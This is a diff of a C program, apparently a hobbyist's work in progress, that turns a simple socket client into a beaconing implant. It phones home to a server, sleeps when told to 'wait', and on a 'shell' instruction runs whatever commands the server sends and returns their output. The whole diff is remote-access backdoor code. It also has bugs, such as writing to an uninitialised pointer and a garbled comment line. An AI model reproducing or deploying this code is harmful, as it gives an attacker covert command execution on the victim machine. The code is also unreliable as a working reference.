@@ -8,9 +8,46 @@
 //declaring functions
 char* run_command(char* command);
 int send_response(int sock, char *response);
+char * phone_home();
 
 
 int main() {
+    char * ph_value;
+
+    while (1) {
+        // phoning home
+        printf("\nPhoning home\n");
+        ph_value = phone_home();
+
+        //printf("ph_value = %s", ph_value);
+
+        // if server says wait, return continue & wait for X time
+        if ( strcmp(ph_value, "continue" ) == 0 ) {
+            printf("SLEEPING IN MAIN\n");
+            sleep(15);
+            //for some reason it sleeps first, then prints?
+        }
+
+        /*
+        else if (ph_value == "err") {
+            printf("ERR: %s", ph_value);
+            return -1;
+        }*/
+
+        // catchall for if nothing matches, it assumes this is an error & exits
+        // Err statemnts/more specifics come from return functions in phone_home
+        else {
+            printf("ERR: %s\n", ph_value);
+            return -1;
+        }
+        
+    }
+    
+    return 1;
+
+}
+
+char * phone_home() {
     int sock = 0, valread;
     struct sockaddr_in serv_addr; //contains server address & port
     char *hello = "Hello from client"; //setting & creating pointer for hello variable
@@ -23,30 +60,34 @@ int main() {
     //AF_INET = ipv4, and SOCK_STREAM means tcp. I think the < is, if it returns greater than 0, exit, as the socket() function returned a 1 (aka fail)
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
         printf("\n Socket creation error \n");
-        return -1;
+        return "err";
     }
 
     // set server address and port, IF there is no failure to connect
 
     //here's that structure again, it's very similar to accessing a variable to another function in python (functionname.variable)
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(8088);
+    serv_addr.sin_port = htons(8089);
        
     // convert IPv4 and IPv6 addresses from text to binary form
     if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) { //does some conversion, not 100% the logic behind it
         printf("\nInvalid address/ Address not supported \n");
-        return -1;
+        return "err";
+        //return -1;
     }
     
     // connect to server (on a 5 second loop)
     //again if the connect function returns a 1 (aka fail) then break and error 
 
-    // connect(socket file descriptor, pointer to server address & port, size of struct socketaddr)
-    while (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-        printf("\nConnection Failed \n");
-        sleep(5);
-        //return -1;
-    }
+    // connect(sockconnect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)et file descriptor, pointer to server address & port, size of struct socketaddr)
+
+    //impleemnt retry later
+    //while (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        //printf("\nConnection Failed \n");
+        //sleep(5);
+    //}
+
+    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
     
     // send message to server
     //send(sock file, message, length of message, 0 = no special flags)
@@ -55,33 +96,65 @@ int main() {
     //printf("Hello message sent\n");
     //send_response(sock, hello);
     
-    while (valread) {
-        printf("DEBUG: waiting on server input ==============\n");
+    ///// Decision tree
 
-        memset(buffer, 0, sizeof(buffer));
+    // heartbeat, aka re connecting to server
+    send_response(sock, "heartbeat");
+    valread = read(sock, buffer, 1024);
 
-        valread = read(sock, buffer, 1024);
-        printf("DEBUG: Command Recieved: %s\n", buffer);
-        
-        send_response(sock, run_command(buffer));
+    printf("BUFFER: %s\n", buffer);
 
-        //clearning buffer
-        //buffer == NULL;
-
-        //debug set value send response
-        //send_response(sock, "test_response");
-
-        //char * balls = "balls";
-        //run_command(balls);
+    if ( buffer == NULL ) {
+        printf("Server Connected, but no instructions");
     }
 
-    return 0;
+    else if ( strcmp(buffer, "wait" ) == 0 ) {
+        printf("SERVER SAYS: WAIT\n");
+        close(sock);
+        return "continue";
+    }
+
+
+    else if ( strcmp(buffer, "shell" ) == 0 ) {
+        printf("SERVER SAYS: SHELL");
+        while (valread) {
+            printf("DEBUG: waiting on server input ==============\n");
+
+            memset(buffer, 0, sizeof(buffer));
+
+            valread = read(sock, buffer, 1024);
+            printf("DEBUG: Command Recieved: %s\n", buffer);
+            
+            send_response(sock, run_command(buffer));
+
+            //clearning buffer
+            //buffer == NULL;
+
+            //debug set value send response
+            //send_response(sock, "test_response");
+
+            //char * balls = "balls";
+            //run_command(balls);
+        }
+    }
+
+    else {
+        char * return_val;
+        sprintf(return_val, "Server Connected, instruction '%s' unknown, or not valid\n", buffer);
+        return return_val;
+    }
+
+    // closing sock 
+    //close(sock);
+
+    //return 0;
 }
 
 
 //this takes the socket file, and the response to send back to the server. 
 int send_response(int sock, char *response) {
-    
+    printf("Sending '%s'\n", response);
+
     if (send(sock, response, strlen(response),0 ) < 0) {
         perror("sending error");
     }
